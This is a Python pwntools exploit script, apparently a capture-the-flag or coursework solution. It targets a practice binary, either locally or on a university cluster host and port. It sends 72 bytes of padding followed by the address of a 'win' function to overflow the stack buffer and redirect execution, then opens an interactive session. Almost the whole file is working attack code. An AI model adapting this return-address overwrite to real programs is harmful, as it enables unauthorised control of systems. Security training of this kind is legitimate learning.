#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exe'
host = 'hexhive005.iccluster.epfl.ch'
port = 9001

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
elf = ELF(exe)
print(len(p64(elf.symbols['win'])))
r.recvline(timeout=1)
l = b'B' * (50 + 22) + p64(elf.symbols['win'])
r.sendline(l)
r.interactive()